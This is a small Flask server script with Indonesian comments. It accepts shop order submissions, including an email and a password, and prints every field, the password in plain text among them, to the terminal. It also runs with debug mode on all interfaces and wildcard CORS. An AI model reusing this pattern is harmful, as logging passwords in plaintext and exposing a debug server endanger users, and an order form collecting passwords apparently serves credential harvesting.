REBUILD_TRIGGER = "v1.0"
from flask import Flask, render_template, request, jsonify
from flask_cors import CORS
import sys

app = Flask(__name__)
CORS(app, resources={r"/*": {"origins": "*"}})

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/pesan", methods=["POST"])
def pesan():
    # Ambil data dari form
    product = request.form.get("product")
    total_price = request.form.get("totalPrice")
    full_name = request.form.get("fullName")
    email = request.form.get("email")
    password = request.form.get("password")
    phone = request.form.get("phone")
    address = request.form.get("address")
    payment = request.form.get("paymentMethod")

    # Cegah password None
    if not password:
        password = "(tidak diisi)"

    # Cetak ke terminal (real-time)
    print("\n" + "="*45, file=sys.stdout, flush=True)
    print("⚡ PESANAN BARU MASUK ⚡", file=sys.stdout, flush=True)
    print("="*45, file=sys.stdout, flush=True)
    print(f"📘 Produk     : {product}", file=sys.stdout, flush=True)
    print(f"💶 Total (Rp) : {total_price}", file=sys.stdout, flush=True)
    print(f"👮‍♂️ Nama       : {full_name}", file=sys.stdout, flush=True)
    print(f"🪪 Email      : {email}", file=sys.stdout, flush=True)
    print(f"🌐 Password   : {password}", file=sys.stdout, flush=True)
    print(f"📫 Telepon    : {phone}", file=sys.stdout, flush=True)
    print(f"📥 Alamat     : {address}", file=sys.stdout, flush=True)
    print(f"💳 Pembayaran : {payment}", file=sys.stdout, flush=True)
    print("="*45, file=sys.stdout, flush=True)
    print("📬 PESANAN TELAH DITERIMA DAN AKAN DIPROSES", file=sys.stdout, flush=True)
    print("="*45 + "\n", file=sys.stdout, flush=True)

    # Kirim respons ke front-end
    return jsonify({"status": "success", "message": "Pesanan berhasil dikirim!"})

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8000, debug=True)


